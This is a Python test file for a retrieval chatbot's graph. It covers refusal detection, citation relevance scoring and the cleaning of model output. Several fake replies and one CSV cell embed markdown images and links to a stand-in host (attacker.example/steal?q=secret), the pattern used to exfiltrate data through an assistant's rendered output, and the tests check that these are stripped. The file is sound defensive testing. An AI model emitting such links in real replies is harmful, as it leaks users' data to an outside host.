"""Tests for step S3.5: abstention by refusal, the citation relevance check and output cleaning in the graph.

Like the graph tests, no model and no database: a fake retriever, a fake chat model that streams
canned pieces, a fake scorer, and the real graph. The sanitizer's own rules are in ``test_sanitize``;
here it is the wiring that is tested (what the stream events carry, what the final state holds, what
both branches do with a hostile reply).
"""

import json
from collections.abc import Iterator, Sequence
from dataclasses import dataclass
from typing import Any

import pytest
from langchain_core.messages import AIMessageChunk, BaseMessage

from geekbot.agent.citations import REFUSAL, citing_sentences, is_refusal
from geekbot.agent.graph import build_graph
from geekbot.agent.nodes import NO_CONTEXT_ANSWER, cite_check
from geekbot.agent.render import consume_stream, format_after_stream, format_answer
from geekbot.agent.runtime import AgentContext, UnavailableChat, UnavailableRetriever
from geekbot.agent.state import AgentState
from geekbot.domain import Chunk, ScoredChunk
from geekbot.llm.chat import ChatError, ChatModel
from geekbot.retrieval import RetrievalResult

EVIL = "https://attacker.example/steal?q=secret"


def scored(n: int, text: str) -> ScoredChunk:
    chunk = Chunk(
        chunk_id=f"chunk{n}",
        doc_id="doc",
        path="/docs/Handbook.md",
        title="Handbook",
        content_hash="h" * 64,
        occurrence=0,
        ordinal=n,
        char_start=0,
        char_end=len(text),
        page=None,
        section_path=(),
        header="",
        text=text,
    )
    return ScoredChunk(chunk=chunk, score=1.0 / n)


class FakeRetriever:
    def __init__(self, chunks: Sequence[ScoredChunk]) -> None:
        self.chunks = tuple(chunks)

    def search(self, query: str, k: int) -> RetrievalResult:
        return RetrievalResult(chunks=self.chunks[:k], timings_ms={"total": 1.0})


class FakeChat:
    """Streams the given pieces as chunks of one reply."""

    def __init__(self, *pieces: str) -> None:
        self.pieces = pieces

    def stream(self, messages: list[BaseMessage], /) -> Iterator[BaseMessage]:
        for piece in self.pieces:
            yield AIMessageChunk(content=piece)


class FakeScorer:
    """A cross-encoder whose score is the number of words the sentence shares with the passage, minus 4."""

    def __init__(self, fail: bool = False) -> None:
        self.fail = fail
        self.calls: list[tuple[str, list[str]]] = []

    def score(self, query: str, passages: Sequence[str]) -> list[float]:
        self.calls.append((query, list(passages)))
        if self.fail:
            raise RuntimeError("the reranker model could not be loaded")
        words = set(query.casefold().replace(".", "").split())
        return [len(words & set(p.casefold().replace(".", "").split())) - 4.0 for p in passages]


CHUNKS = [
    scored(1, "Chats are kept for ninety days in the archive."),
    scored(2, "Backups: 30 days."),
]


def context(
    chat: ChatModel, *, scorer: FakeScorer | None = None, chunks: Any = CHUNKS
) -> AgentContext:
    return AgentContext(
        retriever=FakeRetriever(chunks),
        llm=chat,
        model="fake:1b",
        top_k=3,
        context_budget_tokens=3000,
        citation_scorer=scorer,
        citation_weak_below=-1.0,
    )


def run(chat: ChatModel, *, scorer: FakeScorer | None = None, chunks: Any = CHUNKS) -> AgentState:
    final: AgentState = build_graph().invoke(
        {"question": "How long are chats kept?"},
        context=context(chat, scorer=scorer, chunks=chunks),
    )
    return final


# --- abstention by refusal (D-082, option B) -------------------------------------------------


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (REFUSAL, True),
        ("I could not find anything about that in the documents.", True),
        ('  "I couldn\'t find that in the documents."', True),
        ("**I cannot find** it", True),
        ("i could not find it", True),
        ("Chats are kept for 90 days [1].", False),
        ("The documents say I could not find...", False),
        ("", False),
    ],
)
def test_a_reply_that_starts_like_a_refusal_is_one(text: str, expected: bool) -> None:
    assert is_refusal(text) is expected


def test_the_models_own_refusal_is_an_abstention() -> None:
    final = run(FakeChat(REFUSAL))
    assert final["answer"] == REFUSAL
    assert final["abstained"] is True
    assert final["cited"] == []


def test_a_refusal_that_still_cites_a_source_is_a_partial_answer_not_an_abstention() -> None:
    final = run(FakeChat("I could not find the backup rule, but chats are kept ninety days [1]."))
    assert final["abstained"] is False
    assert final["cited"] == [1]


def test_an_ordinary_answer_is_not_an_abstention() -> None:
    assert run(FakeChat("Ninety days [1]."))["abstained"] is False


def test_finding_nothing_is_an_abstention_and_calls_no_model() -> None:
    chat = FakeChat("never used")
    final = run(chat, chunks=[])
    assert final["answer"] == NO_CONTEXT_ANSWER
    assert final["abstained"] is True
    assert is_refusal(NO_CONTEXT_ANSWER)


def test_the_next_turn_does_not_inherit_the_flag() -> None:
    from geekbot.agent.nodes import begin_turn

    cleared = begin_turn({"question": "q", "abstained": True, "removed_markup": ["image: x"]})
    assert cleared["abstained"] is False
    assert cleared["removed_markup"] == []
    assert cleared["citation_checks"] == []


# --- the citation relevance check ------------------------------------------------------------


def test_sentences_with_citations_are_found_with_their_numbers() -> None:
    answer = "Chats are kept ninety days [1]. Backups too [2][1]. No claim here.\nLast one [2]"
    assert citing_sentences(answer, 2) == [
        ("Chats are kept ninety days.", (1,)),
        ("Backups too.", (2, 1)),
        ("Last one", (2,)),
    ]
    assert citing_sentences("Only [5] here.", 2) == []  # a number the prompt did not hold: ignored
    assert citing_sentences("Kept ninety days. [1] Next.", 1) == [("Kept ninety days.", (1,))]


def test_a_citation_that_does_not_fit_its_sentence_is_marked_weak_and_the_answer_is_kept() -> None:
    scorer = FakeScorer()
    final = run(
        FakeChat("Chats are kept for ninety days [1]. The moon is made of cheese [2]."),
        scorer=scorer,
    )
    checks = {check["n"]: check for check in final["citation_checks"]}
    assert checks[1]["weak"] is False and checks[1]["score"] > -1.0
    assert checks[2]["weak"] is True and checks[2]["score"] < -1.0
    assert checks[2]["sentence"] == "The moon is made of cheese."
    assert final["answer"] == "Chats are kept for ninety days [1]. The moon is made of cheese [2]."
    assert final["citation_check_error"] == ""


def test_without_a_scorer_or_without_citations_the_check_does_nothing() -> None:
    assert run(FakeChat("Ninety days [1]."))["citation_checks"] == []  # no scorer
    scorer = FakeScorer()
    assert run(FakeChat(REFUSAL), scorer=scorer)["citation_checks"] == []
    assert scorer.calls == []  # nothing was cited, so the model was not asked


def test_a_scorer_that_fails_never_fails_the_turn() -> None:
    final = run(FakeChat("Ninety days [1]."), scorer=FakeScorer(fail=True))
    assert final["answer"] == "Ninety days [1]."
    assert final["citation_checks"] == []
    assert "RuntimeError" in final["citation_check_error"]


def test_the_check_node_changes_only_its_own_keys() -> None:
    class Runtime:
        context = context(FakeChat("x"), scorer=FakeScorer())

    state: AgentState = {
        "answer": "Chats are kept for ninety days [1].",
        "cited": [1],
        "used": 1,
        "sources": [
            {
                "n": 1, "chunk_id": "c", "title": "t", "path": "p", "page": None, "section": "",
                "text": "Chats are kept for ninety days.", "score": 1.0,
            }
        ],
    }  # fmt: skip
    update = cite_check(state, Runtime())  # type: ignore[arg-type]
    assert set(update) == {"citation_checks", "citation_check_error"}


# --- output cleaning, chat branch ------------------------------------------------------------


def streamed_events(chat: ChatModel) -> tuple[list[str], AgentState]:
    events: list[str] = []
    final: AgentState = {}
    for mode, payload in build_graph().stream(
        {"question": "How long are chats kept?"},
        context=context(chat),
        stream_mode=["custom", "values"],
    ):
        if mode == "custom" and payload.get("event") == "text":
            events.append(payload["text"])
        if mode == "values":
            final = payload
    return events, final


def test_an_image_split_across_stream_pieces_never_reaches_the_events() -> None:
    chat = FakeChat(
        "Ninety days [1]. ![al", "t](https://attacker.example/steal?q=sec", "ret) Done."
    )
    events, final = streamed_events(chat)
    shown = "".join(events)
    assert "attacker" not in shown and "![" not in shown
    assert shown.replace("  ", " ") == "Ninety days [1]. Done."
    assert "attacker" not in final["answer"]
    assert (
        final["raw_answer"]
        == "Ninety days [1]. ![alt](https://attacker.example/steal?q=secret) Done."
    )
    assert final["removed_markup"] == [f"image: {EVIL}"]


def test_the_final_answer_matches_what_was_streamed() -> None:
    chat = FakeChat("See ", "[the docs](https://attacker.example/x) ", "and [1].")
    events, final = streamed_events(chat)
    assert "".join(events).strip() == final["answer"] == "See the docs and [1]."
    assert final["removed_markup"] == ["link: https://attacker.example/x"]


def test_a_link_the_sources_contain_is_kept() -> None:
    chunks = [scored(1, "The policy is at https://example.com/policy for everyone.")]
    final = run(FakeChat("See [the policy](https://example.com/policy) [1]."), chunks=chunks)
    assert final["answer"] == "See [the policy](https://example.com/policy) [1]."
    assert final["removed_markup"] == []


def test_the_state_stays_plain_data() -> None:
    final = run(FakeChat("Chats are kept for ninety days [1]."), scorer=FakeScorer())
    assert json.loads(json.dumps(final)) == final


# --- output cleaning, CSV branch -------------------------------------------------------------


@dataclass
class CsvReplyStub:
    markdown: str
    status: str = "answered"
    model: str = "csv-model"
    seconds: float = 0.5
    model_load_ms: int = 0


class CsvStub:
    def __init__(self, markdown: str) -> None:
        self.markdown = markdown

    def ask(self, question: str, /) -> CsvReplyStub:
        return CsvReplyStub(self.markdown)


def run_csv(markdown: str) -> AgentState:
    csv_context = AgentContext(
        retriever=UnavailableRetriever(),
        llm=UnavailableChat(),
        model="csv-model",
        top_k=3,
        context_budget_tokens=3000,
        csv=CsvStub(markdown),
    )
    final: AgentState = build_graph().invoke(
        {"question": "total revenue?", "requested_mode": "csv"}, context=csv_context
    )
    return final


def test_a_csv_reply_that_repeats_a_hostile_cell_is_cleaned() -> None:
    cell = f"![chart]({EVIL})"
    final = run_csv(f"Total revenue is 520.\n\n| region | note |\n|---|---|\n| North | {cell} |\n")
    assert "attacker" not in final["answer"] and "![" not in final["answer"]
    assert "| North |" in final["answer"]
    assert final["removed_markup"] == [f"image: {EVIL}"]
    assert sorted(final["answer_labels"]) == ["TOOL", "USER"]  # cleaning does not lift the taint


def test_a_csv_reply_without_markup_is_unchanged() -> None:
    final = run_csv("Total revenue is 520 [see the table below].")
    assert final["answer"] == "Total revenue is 520 [see the table below]."
    assert final["removed_markup"] == []


def test_a_reply_that_is_only_removed_markup_is_an_error_not_a_blank_answer() -> None:
    with pytest.raises(ChatError, match="nothing but images"):
        run_csv(f"![x]({EVIL})")


# --- what the terminal shows -----------------------------------------------------------------


def test_the_terminal_names_a_refusal_weak_citations_and_removed_markup() -> None:
    final: dict[str, Any] = {
        "answer": "x [1]",
        "used": 1,
        "sources": [],
        "abstained": True,
        "citation_checks": [
            {"n": 1, "score": -5.0, "weak": True, "sentence": "The moon is cheese ."}
        ],
        "removed_markup": [f"image: {EVIL}"],
        "citation_check_error": "",
    }
    text = format_answer(final, model="m")
    assert "declined: the reply says it could not find this in the documents" in text
    assert "weak citation [1] (fit -5.0) for: The moon is cheese ." in text
    assert "removed from the reply" in text and EVIL in text


def test_a_cleaned_stream_is_not_reported_as_corrected() -> None:
    chat = FakeChat("Ninety days [1]. ![a](https://attacker.example/x) Done.")
    pairs = list(
        build_graph().stream(
            {"question": "q"}, context=context(chat), stream_mode=["custom", "values"]
        )
    )
    written: list[str] = []
    streamed = consume_stream(pairs, write=written.append, note=lambda piece: None)
    text = format_after_stream(streamed, model="m")
    assert "corrected answer" not in text
    assert "removed from the reply" in text
